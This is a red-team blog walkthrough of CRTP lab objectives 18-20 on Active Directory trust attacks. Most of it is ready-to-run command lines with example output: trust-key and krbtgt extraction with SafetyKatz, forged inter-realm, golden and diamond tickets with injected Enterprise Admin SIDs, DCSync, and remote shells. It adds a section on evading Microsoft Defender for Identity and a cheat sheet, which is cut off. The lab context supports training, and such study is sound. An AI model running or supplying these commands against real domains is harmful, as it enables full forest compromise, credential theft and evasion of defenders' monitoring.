---
title: "CRTP Deep Dive: sIDHistory Abuse & Cross-Domain Trust Attacks (OBJ 18-20)"
date: 2026-04-10 21:30:00 +0200
categories: [Red Team, CRTP]
tags: [sid-history, trust-attacks, golden-ticket, silver-ticket, diamond-ticket, kerberos, cross-forest, mdi-bypass, rubeus, safetykatz]
description: "Master sIDHistory injection, trust key extraction, inter-realm ticket forging, and cross-forest access — with MDI bypass techniques using Golden, Silver, and Diamond tickets."
pin: false
math: false
mermaid: false
---

> This blog covers **Learning Objectives 18, 19, and 20** from the CRTP course by Altered Security.
> All commands are **PowerShell / Windows only**. No Linux tools are used anywhere.
{: .prompt-info }

---

## What is sIDHistory?

When a user account is **migrated from one domain to another**, the old SID is preserved inside a special attribute called `sIDHistory`. This lets the user retain access to resources in the old domain even after migration.

```
┌─────────────────────────────────────────────────────────────────────┐
│                      sIDHistory — Normal Use Case                   │
│                                                                     │
│   Domain A (old)              Domain B (new)                        │
│  ┌───────────────┐           ┌───────────────────────────────────┐  │
│  │  User: Alice  │  Migrate  │  User: Alice                      │  │
│  │  SID: A-500   │ ────────► │  SID: B-1234  (new)               │  │
│  └───────────────┘           │  sIDHistory: [A-500]  (old)       │  │
│                               │  ✅ Still accesses Domain A files │  │
│                               └───────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

**The abuse:** An attacker with `krbtgt` or trust key can forge a Kerberos ticket and inject ANY SID into `sIDHistory` — including the **Enterprise Admins group SID** of the parent domain. The parent domain DC will honour this injected SID and grant Enterprise Admin privileges.

---

## Two Paths to Abuse sIDHistory

```
┌──────────────────────────────────────────────────────────────────────────┐
│              sIDHistory Abuse — Two Attack Paths                         │
│                                                                          │
│  Path 1: Trust Key (evasive-silver)                                      │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │  Attacker (dcorp DA)                                               │  │
│  │       │                                                            │  │
│  │       ▼                                                            │  │
│  │  Extract trust key (dcorp → mcorp) from dcorp-dc                  │  │
│  │       │                                                            │  │
│  │       ▼                                                            │  │
│  │  Forge inter-realm TGT with EA SID in sIDHistory                  │  │
│  │       │                                                            │  │
│  │       ▼                                                            │  │
│  │  Request TGS for mcorp-dc (asktgs)                                │  │
│  │       │                                                            │  │
│  │       ▼                                                            │  │
│  │  Access mcorp-dc as Enterprise Admin ✅                           │  │
│  └────────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  Path 2: krbtgt Hash (evasive-golden)                                    │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │  Attacker (dcorp DA)                                               │  │
│  │       │                                                            │  │
│  │       ▼                                                            │  │
│  │  Use dcorp krbtgt AES256 (already extracted)                      │  │
│  │       │                                                            │  │
│  │       ▼                                                            │  │
│  │  Forge Golden Ticket with EA SID in sIDHistory (/ptt)             │  │
│  │       │                                                            │  │
│  │       ▼                                                            │  │
│  │  Access mcorp-dc directly (no asktgs needed) ✅                   │  │
│  └────────────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## Lab Environment

```
┌──────────────────────────────────────────────────────────────────────┐
│                         CRTP Lab Overview                            │
│                                                                      │
│   Forest: moneycorp.local                 Forest: eurocorp.local     │
│  ┌─────────────────────────────┐         ┌──────────────────────┐   │
│  │  moneycorp.local (parent)   │◄───────►│  eurocorp.local      │   │
│  │  mcorp-dc                   │  forest │  eurocorp-dc         │   │
│  │  SID: S-1-5-21-335606...    │  trust  │  SharedwithDCorp     │   │
│  │  EA SID: ...-519            │         └──────────────────────┘   │
│  │           ▲                 │                                     │
│  │       parent/child          │                                     │
│  │           │                 │                                     │
│  │  dollarcorp.moneycorp.local │                                     │
│  │  dcorp-dc  dcorp-ci         │                                     │
│  │  dcorp-mgmt dcorp-studentX  │                                     │
│  │  SID: S-1-5-21-719815819-  │                                     │
│  │       3726368948-3917688648 │                                     │
│  └─────────────────────────────┘                                     │
└──────────────────────────────────────────────────────────────────────┘
```

| Domain | FQDN | SID |
|--------|------|-----|
| Child | `dollarcorp.moneycorp.local` | `S-1-5-21-719815819-3726368948-3917688648` |
| Parent | `moneycorp.local` | `S-1-5-21-335606122-960912869-3279953914` |
| Enterprise Admins | (mcorp group) | `S-1-5-21-335606122-960912869-3279953914-519` |
| External | `eurocorp.local` | `S-1-5-21-3333069040-3914854601-3606488808` |

---

## Learning Objective 18 — Trust Key → Enterprise Admins

**Goal:** Use the inter-domain trust key to forge a referral ticket with EA SID in sIDHistory and gain access to `mcorp-dc`.

```
┌──────────────────────────────────────────────────────────────────────────┐
│          OBJ 18 — Attack Flow (Trust Key / evasive-silver)               │
│                                                                          │
│  Step 1: Get DA process (asktgt svcadmin)                                │
│  Step 2: Copy Loader.exe → dcorp-dc                                      │
│  Step 3: winrs into dcorp-dc                                             │
│  Step 4: portproxy (8080 → studentX:80)                                  │
│  Step 5: lsadump::evasive-trust → grab rc4_hmac_nt trust key            │
│  Step 6: evasive-silver → forge inter-realm TGT with /sids EA-519       │
│  Step 7: asktgs /service:http/mcorp-dc → inject TGS                      │
│  Step 8: winrs -r:mcorp-dc → shell as Administrator ✅                   │
└──────────────────────────────────────────────────────────────────────────┘
```

### Step 1 — Start a Process with DA Privileges

First, get a process running under svcadmin (Domain Admin) credentials:

```powershell
# Run from an elevated prompt on dcorp-studentX
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

**Example Output:**
```
[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 6366243a657a4ea04e406f1abc27f1...
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\svcadmin'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):
      doIFujCCBbagAwIBBaEDAgEW...

[+] Ticket successfully imported!

[*] CreateNetOnly:
[*]   ProcessID   : 4512
[*]   LUID        : 0x1a4d08
[*] Spawned a new protected process: C:\Windows\System32\cmd.exe
```

> A new `cmd.exe` window will open running as svcadmin. Do all next steps from that window.
{: .prompt-tip }

---

### Step 2 — Copy Loader.exe to dcorp-dc

From the DA `cmd.exe` window:

```powershell
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
```

**Example Output:**
```
Does \\dcorp-dc\C$\Users\Public\Loader.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Loader.exe
1 File(s) copied
```

---

### Step 3 — Remote Shell into dcorp-dc

```powershell
winrs -r:dcorp-dc cmd
```

**Example Output:**
```
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Users\svcadmin>
```

---

### Step 4 — Set Up Port Proxy (Tunnel to Your Student VM)

This lets dcorp-dc reach your student machine's HTTP server to load SafetyKatz in memory:

```powershell
# Replace X with your student number (e.g., 172.16.100.3 for student3)
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.X
```

> This tunnels `dcorp-dc:8080` → `dcorp-studentX:80`. Your student machine must be serving `SafetyKatz.exe` over HTTP (e.g., HFS or Python HTTP server started earlier).
{: .prompt-info }

---

### Step 5 — Extract the Trust Key

Now extract the trust credentials directly from dcorp-dc:

```powershell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
```

**Example Output:**
```
mimikatz # lsadump::evasive-trust /patch

Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-719815819-3726368948-3917688648)

Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-335606122-960912869-3279953914)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
    * 2/24/2023 1:11:33 AM - CLEAR
        * aes256_hmac       34f94d19178a75cb04b9c10e657623c5ac9074fbc7fcf4e20be8527b77407243
        * aes128_hmac       40856eb80d3323adf23a3b7faad3c180
        * rc4_hmac_nt       132f54e05f7c3db02e97c00ff3879067   ← GRAB THIS
```

> Note the `rc4_hmac_nt` value — this is your **trust key**. The `[In]` direction means it is used to authenticate tickets coming from dcorp into mcorp.
{: .prompt-tip }

**Three alternative ways to extract the trust key:**
```powershell
# Method 1 - evasive-trust (preferred, evades MDI)
SafetyKatz.exe "lsadump::evasive-trust /patch"

# Method 2 - dcsync targeting the mcorp$ trust account
SafetyKatz.exe "lsadump::dcsync /user:dcorp\mcorp$"

# Method 3 - dump all LSA secrets
SafetyKatz.exe "lsadump::lsa /patch"
```

---

### Step 6 — Forge the Inter-Realm TGT (evasive-silver)

Back on your **student machine** (not dcorp-dc), forge the ticket:

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:132f54e05f7c3db02e97c00ff3879067 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
```

**Parameter breakdown:**

```
┌─────────────────────────────────────────────────────────────────────┐
│               evasive-silver Parameter Reference                    │
├──────────────────────────────┬──────────────────────────────────────┤
│ /service:krbtgt/DCORP...     │ Target: inter-realm TGT service      │
│ /rc4:132f54e...              │ Trust key (rc4_hmac_nt from step 5)  │
│ /sid:S-1-5-21-719815819-...  │ SID of YOUR domain (dcorp)           │
│ /sids:S-1-5-21-335606...-519 │ SID to inject: mcorp Enterprise Admins│
│ /ldap                        │ Pull PAC data from DC via LDAP       │
│ /user:Administrator          │ Username in the forged ticket        │
│ /nowrap                      │ Output base64 on one line (no breaks)│
└──────────────────────────────┴──────────────────────────────────────┘
```

**Example Output:**
```
[*] Action: Build Service Ticket

[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ExtraSIDs      : S-1-5-21-335606122-960912869-3279953914-519

[*] ServiceName     : krbtgt/DOLLARCORP.MONEYCORP.LOCAL
[*] ServiceRealm    : DOLLARCORP.MONEYCORP.LOCAL
[*] UserName        : Administrator
[*] UserRealm       : DOLLARCORP.MONEYCORP.LOCAL
[*] StartTime       : 4/10/2026 9:30:00 PM
[*] EndTime         : 4/11/2026 7:30:00 AM
[*] RenewTill       : 4/17/2026 9:30:00 PM

[*] base64(ticket.kirbi):
      doIGPjCCBjqgAwIBBaEDAgEWooIFMDCCBSyhAwIBBaENGwtEQ09SUC5MT0...  ← COPY THIS
```

---

### Step 7 — Request TGS and Inject

Use the forged inter-realm TGT to request a service ticket for `http/mcorp-dc`:

```powershell
# Paste the full base64 ticket from step 6 after /ticket:
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:doIGPjCCBjqgAwIBBaEDAgEWooIFMDCCBSyhAwIBBaENGwtEQ09SUC5MT0...
```

**Example Output:**
```
[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'http/mcorp-dc.MONEYCORP.LOCAL'
[*] Using domain controller: mcorp-dc.MONEYCORP.LOCAL (172.16.1.1)
[+] TGS request successful!
[+] Ticket successfully imported!

  ServiceName              :  http/mcorp-dc.MONEYCORP.LOCAL
  ServiceRealm             :  MONEYCORP.LOCAL
  UserName                 :  Administrator
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  4/10/2026 9:35:00 PM
  EndTime                  :  4/11/2026 7:30:00 AM
  RenewTill                :  4/17/2026 9:30:00 PM
  Flags                    :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  TFgNOBBkbYb0cHZzAQ==
```

---

### Step 8 — Access mcorp-dc

```powershell
winrs -r:mcorp-dc.moneycorp.local cmd
```

**Example Output:**
```
Microsoft Windows [Version 10.0.20348.2227]
(c) Microsoft Corporation. All rights reserved.

C:\Users\TEMP> set username
USERNAME=Administrator

C:\Users\TEMP> set computername
COMPUTERNAME=MCORP-DC
```

You now have a shell on the parent domain DC as Administrator.

---

## Learning Objective 19 — krbtgt Hash → Enterprise Admins

**Goal:** Use dcorp's `krbtgt` AES256 hash to forge a Golden Ticket with EA SID in sIDHistory and gain access to `mcorp-dc`.

```
┌──────────────────────────────────────────────────────────────────────────┐
│          OBJ 19 — Attack Flow (Golden Ticket / evasive-golden)           │
│                                                                          │
│  ✅ Prerequisite: dcorp krbtgt AES256 already extracted (prev labs)      │
│                                                                          │
│  Step 1: evasive-golden → forge Golden Ticket with /sids EA-519 /ptt    │
│  Step 2: winrs -r:mcorp-dc → immediate shell as Administrator ✅         │
│  Step 3 (bonus): evasive-dcsync → dump mcorp krbtgt hash                 │
└──────────────────────────────────────────────────────────────────────────┘
```

> This is simpler than OBJ 18 — no need to extract trust keys or run `asktgs`. The Golden Ticket is directly injected and trusted by the parent domain because of the parent/child trust relationship.
{: .prompt-tip }

### Step 1 — Forge and Inject the Golden Ticket

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt
```

**Parameter breakdown:**

```
┌─────────────────────────────────────────────────────────────────────┐
│               evasive-golden Parameter Reference                    │
├──────────────────────────────┬──────────────────────────────────────┤
│ /user:Administrator          │ Username in the forged ticket        │
│ /id:500                      │ RID of the user (500 = Administrator)│
│ /domain:dollarcorp...        │ Your domain FQDN                     │
│ /sid:S-1-5-21-719815819-...  │ SID of your domain (dcorp)           │
│ /sids:S-1-5-21-335606...-519 │ EA SID injected into sIDHistory      │
│ /aes256:154cb662...          │ dcorp krbtgt AES256 hash             │
│ /netbios:dcorp               │ NetBIOS name of the domain           │
│ /ptt                         │ Inject ticket into current session   │
└──────────────────────────────┴──────────────────────────────────────┘
```

**Example Output:**
```
[*] Action: Build Golden Ticket

[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-335606122-960912869-3279953914-519

[*] ServiceName     : krbtgt/dcorp
[*] UserName        : Administrator
[*] StartTime       : 4/10/2026 9:40:00 PM
[*] EndTime         : 4/11/2026 7:40:00 AM

[+] Ticket successfully imported!
```

### Step 2 — Access mcorp-dc

```powershell
winrs -r:mcorp-dc.moneycorp.local cmd
```

**Example Output:**
```
Microsoft Windows [Version 10.0.20348.2227]
(c) Microsoft Corporation. All rights reserved.

C:\Users\TEMP> set username
USERNAME=Administrator

C:\Users\TEMP> set computername
COMPUTERNAME=MCORP-DC
```

### Step 3 (Bonus) — DCSync mcorp krbtgt

From the mcorp-dc shell (or the session with the injected ticket):

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

**Example Output:**
```
[DC] 'moneycorp.local' will be the domain
[DC] 'mcorp-dc.moneycorp.local' will be the DC server
[DC] 'mcorp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **
SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )

Credentials:
  Hash NTLM: a0981492d5dfab1ae0b97b51ea895ddf
    ntlm- 0: a0981492d5dfab1ae0b97b51ea895ddf
    lm  - 0: 87836055143ad5a507de2aaeb9000361
```

You now own `moneycorp.local` completely.

---

## MDI Bypass — Evasive Tickets Using DC Identity

Microsoft Defender for Identity (MDI) alerts on Golden Tickets forged for user accounts. The bypass is to impersonate a **Domain Controller machine account** instead, and inject the **Domain Controllers group SID** into sIDHistory.

```
┌──────────────────────────────────────────────────────────────────────────┐
│                    MDI Detection vs. Bypass                              │
│                                                                          │
│  ❌ Standard Golden Ticket (DETECTED by MDI)                             │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │  /user:Administrator   → MDI sees unusual ticket for user acct    │  │
│  │  /id:500               → RID 500 triggers alert                   │  │
│  │  No DC SIDs in groups  → Anomalous PAC structure                  │  │
│  └────────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  ✅ Evasive Golden Ticket (BYPASSES MDI)                                 │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │  /user:dcorp-dc$       → Looks like DC machine account            │  │
│  │  /id:1000              → Normal machine account RID               │  │
│  │  /sids:...-516,S-1-5-9 → Domain Controllers + Enterprise DCs SIDs │  │
│  │  Ticket looks like a legitimate DC Kerberos exchange              │  │
│  └────────────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────────────┘
```

**Key SIDs for MDI bypass:**

| SID | Meaning |
|-----|---------|
| `S-1-5-21-...-516` | Domain Controllers group (replace prefix with your domain SID) |
| `S-1-5-9` | Enterprise Domain Controllers (universal, same in every forest) |

### MDI Bypass — SafetyKatz (Mimikatz style)

```powershell
# Forge evasive Golden Ticket impersonating dcorp-dc$
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "kerberos::golden /user:dcorp-dc$ /id:1000 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"
```

### MDI Bypass — Rubeus (evasive-golden)

```powershell
# Rubeus version using AES256 (more opsec than RC4)
C:\AD\Tools\Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:dcorp-dc$ /id:1000 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /dc:dcorp-dc.dollarcorp.moneycorp.local /ptt
```

Then DCSync mcorp:
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

---

## Diamond Ticket with SID History (Best Evasion)

A **Diamond Ticket** modifies a real, legitimately issued TGT rather than forging one from scratch. This makes it virtually undetectable because the ticket comes from a real KDC exchange.

```
┌──────────────────────────────────────────────────────────────────────────┐
│           Golden vs. Diamond Ticket — Key Difference                     │
│                                                                          │
│  Golden Ticket                                                           │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │  Attacker crafts TGT from scratch using krbtgt hash               │  │
│  │  Never touches the KDC → suspicious (no AS-REQ logged)            │  │
│  │  MDI: detects missing pre-authentication event                    │  │
│  └────────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  Diamond Ticket                                                          │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │  1. Rubeus requests a REAL TGT from the KDC (via /tgtdeleg)       │  │
│  │  2. Decrypts it using krbtgt key                                   │  │
│  │  3. Modifies the PAC (adds SID history, changes user fields)      │  │
│  │  4. Re-encrypts and injects                                        │  │
│  │  ✅ KDC sees a real AS-REQ / AS-REP → no anomaly detected         │  │
│  └────────────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────────────┘
```

```powershell
C:\AD\Tools\Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:dcorp-dc$ /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:1000 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

**Parameter breakdown:**

```
┌─────────────────────────────────────────────────────────────────────┐
│               Diamond Ticket Parameter Reference                    │
├──────────────────────────────┬──────────────────────────────────────┤
│ /krbkey:154cb662...          │ dcorp krbtgt AES256 key              │
│ /tgtdeleg                    │ Request a real delegated TGT first   │
│ /enctype:aes                 │ Use AES encryption (more opsec)      │
│ /ticketuser:dcorp-dc$        │ Impersonate DC machine account       │
│ /ticketuserid:1000           │ Machine account RID                  │
│ /sids:...-516,S-1-5-9        │ Add DC group SIDs to sIDHistory      │
│ /createnetonly:cmd.exe       │ Spawn new process with ticket        │
│ /show                        │ Show the spawned process window      │
│ /ptt                         │ Inject into current session          │
└──────────────────────────────┴──────────────────────────────────────┘
```

Then DCSync from the new window:
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

---

## Learning Objective 20 — Cross-Forest Access (eurocorp.local)

**Goal:** Use DA access on dcorp to access the `SharedwithDCorp` share on `eurocorp-dc` in the external `eurocorp.local` forest.

```
┌──────────────────────────────────────────────────────────────────────────┐
│          OBJ 20 — Cross-Forest Attack Flow                               │
│                                                                          │
│  Why is this different from OBJ 18?                                      │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │  OBJ 18: Parent/Child (same forest) → SID History ALLOWED         │  │
│  │  OBJ 20: External Forest trust   → SID History FILTERED OUT       │  │
│  │                                                                    │  │
│  │  Cross-forest trusts have SID Filtering enabled by default.       │  │
│  │  You CANNOT inject EA SIDs. You can only get what the external    │  │
│  │  domain has explicitly shared with your domain.                   │  │
│  └────────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  Step 1: Extract eurocorp trust key from dcorp-dc                        │
│  Step 2: evasive-silver (NO /sids — filtering blocks it)                 │
│  Step 3: asktgs /service:cifs/eurocorp-dc → inject TGS                   │
│  Step 4: dir \\eurocorp-dc\SharedwithDCorp ✅                            │
└──────────────────────────────────────────────────────────────────────────┘
```

> **Critical difference:** For cross-forest trusts, you do NOT add `/sids` to the forged ticket. SID filtering on the forest boundary will strip any foreign SIDs from the PAC. You only get access to resources the external forest has explicitly shared.
{: .prompt-warning }

### Step 1 — Extract the eurocorp Trust Key

Same process as OBJ 18 — get DA shell on dcorp-dc and run:

```powershell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
```

**Example Output (eurocorp section):**
```
Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-3333069040-3914854601-3606488808)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
    * 2/24/2023 1:10:52 AM - CLEAR
        * aes256_hmac       bc1e5642c1afebbeeb76b9ba6f688ea0c876ecac7ecdd4b7e95d5beb35d886df
        * aes128_hmac       9896c96f784de9a0341150b7fa1e2360
        * rc4_hmac_nt       163373571e6c3e09673010fd60accdf0   ← GRAB THIS
```

---

### Step 2 — Forge the Cross-Forest Referral Ticket

Note: **no `/sids` parameter** — SID filtering would reject it anyway:

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:163373571e6c3e09673010fd60accdf0 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap
```

**Example Output:**
```
[*] Action: Build Service Ticket

[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ExtraSIDs      : (none — no /sids used for cross-forest)

[*] ServiceName     : krbtgt/DOLLARCORP.MONEYCORP.LOCAL
[*] UserName        : Administrator
[*] UserRealm       : DOLLARCORP.MONEYCORP.LOCAL

[*] base64(ticket.kirbi):
      doIGPjCCBjqgAwIBBaEDAgEWooIFMDCCBSyhAwIBBaENGwtEQ09SUC5MT0...   ← COPY THIS
```

---

### Step 3 — Request CIFS TGS and Inject

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:doIGPjCCBjqgAwIBBaEDAgEWooIFMDCCBSyhAwIBBaENGwtEQ09SUC5MT0...
```

**Example Output:**
```
[*] Action: Ask TGS

[*] Building TGS-REQ request for: 'cifs/eurocorp-dc.eurocorp.LOCAL'
[*] Using domain controller: eurocorp-dc.eurocorp.LOCAL (172.16.50.1)
[+] TGS request successful!
[+] Ticket successfully imported!

  ServiceName              :  CIFS/eurocorp-dc.eurocorp.LOCAL
  ServiceRealm             :  EUROCORP.LOCAL
  UserName                 :  Administrator
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  4/10/2026 9:50:00 PM
  EndTime                  :  4/11/2026 7:50:00 AM
```

---

### Step 4 — Access the Shared Resource

```powershell
dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
```

**Example Output:**
```
 Volume in drive \\eurocorp-dc.eurocorp.local\SharedwithDCorp has no label.
 Volume Serial Number is 1A5A-FDE2

 Directory of \\eurocorp-dc.eurocorp.local\SharedwithDCorp

11/16/2022  04:26 AM    <DIR>          .
11/15/2022  06:17 AM                29 secret.txt
               1 File(s)             29 bytes
               2 Dir(s)  14,017,421,312 bytes free
```

```powershell
type \\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt
```

```
Dollarcorp DAs can read this!
```

> You can only access resources that eurocorp has **explicitly shared** with dollarcorp. To discover other accessible resources, you would need to request a TGS for each service manually and attempt access — there is no automatic enumeration across a filtered forest trust.
{: .prompt-warning }

---

## OBJ 18 vs 19 vs 20 — Side-by-Side Comparison

```
┌──────────────────────────────────────────────────────────────────────────┐
│                     Attack Comparison Table                              │
├────────────┬───────────────┬─────────────────┬───────────────────────────┤
│ Objective  │ Key Material  │ Ticket Type      │ Result                   │
├────────────┼───────────────┼─────────────────┼───────────────────────────┤
│ OBJ 18     │ Trust key     │ evasive-silver   │ EA on mcorp-dc           │
│            │ (rc4/aes256)  │ + asktgs         │ (inter-realm referral)   │
├────────────┼───────────────┼─────────────────┼───────────────────────────┤
│ OBJ 19     │ krbtgt hash   │ evasive-golden   │ EA on mcorp-dc           │
│            │ (aes256)      │ (direct /ptt)    │ (no asktgs needed)       │
├────────────┼───────────────┼─────────────────┼───────────────────────────┤
│ OBJ 20     │ ecorp trust   │ evasive-silver   │ Access SharedwithDCorp   │
│            │ key (rc4)     │ + asktgs (cifs)  │ (no SID history — filtered)│
└────────────┴───────────────┴─────────────────┴───────────────────────────┘
```

---

## Evasion Tier List

```
┌──────────────────────────────────────────────────────────────────────────┐
│                 Ticket Evasion Tier List (Best → Worst)                  │
│                                                                          │
│  Tier 1 — Diamond Ticket                                                 │
│  ✅ Real AS-REQ/AS-REP logged  ✅ No forged PAC anomaly                  │
│  ✅ Bypasses MDI Golden Ticket detection                                  │
│  Best for: full OpSec environments                                        │
│                                                                          │
│  Tier 2 — evasive-golden (DC identity + DC SIDs)                        │
│  ✅ Impersonates DC machine account  ✅ DC group SIDs in PAC              │
│  ⚠ No real AS-REQ but PAC looks legitimate                               │
│  Best for: MDI environments                                               │
│                                                                          │
│  Tier 3 — evasive-silver (Trust key inter-realm)                         │
│  ✅ Uses trust key not krbtgt  ✅ Normal referral flow                    │
│  ⚠ Forged PAC but through legitimate trust mechanism                     │
│  Best for: when you have trust key but not krbtgt                        │
│                                                                          │
│  Tier 4 — Standard Golden Ticket (Administrator account)                 │
│  ❌ No AS-REQ logged  ❌ User 500 in PAC  ❌ MDI alert                    │
│  Only use in: CTF / no MDI environments                                  │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## Quick Reference Cheat Sheet

```
┌──────────────────────────────────────────────────────────────────────────┐
│            sIDHistory & Trust Attacks — Full Cheat Sheet                 │
│                                                                          │
│  ── TRUST KEY EXTRACTION ──────────────────────────────────────────────  │
│                                                                          │
│  # Method 1: evasive-trust (best, no LSASS touch)                        │
│  Loader.exe -path SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
│                                                                          │
│  # Method 2: dcsync the trust account                                    │
│  Loader.exe -path SafetyKatz.exe -args "lsadump::dcsync /user:dcorp\mcorp$" "exit"
│                                                                          │
│  # Method 3: dump all LSA secrets                                        │
│  Loader.exe -path SafetyKatz.exe -args "lsadump::lsa /patch" "exit"     │
│                                                                          │
│  ── OBJ 18: INTER-REALM TGT (TRUST KEY) ──────────────────────────────  │
│                                                                          │
│  # 1. Forge inter-realm TGT                                              │
│  Loader.exe -path Rubeus.exe -args evasive-silver                        │
│    /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL                            │
│    /rc4:<trust_rc4> /sid:<dcorp_sid>                                     │
│    /sids:<mcorp_ea_sid-519> /ldap /user:Administrator /nowrap            │
│                                                                          │
│  # 2. Request TGS with forged TGT                                        │
│  Loader.exe -path Rubeus.exe -args asktgs                                │
│    /service:http/mcorp-dc.MONEYCORP.LOCAL                                │
│    /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:<base64>                   │
│                                                                          │
│  # 3. Access parent DC                                                   │
│  winrs -r:mcorp-dc.moneycorp.local cmd                                  │
│                                                                          │
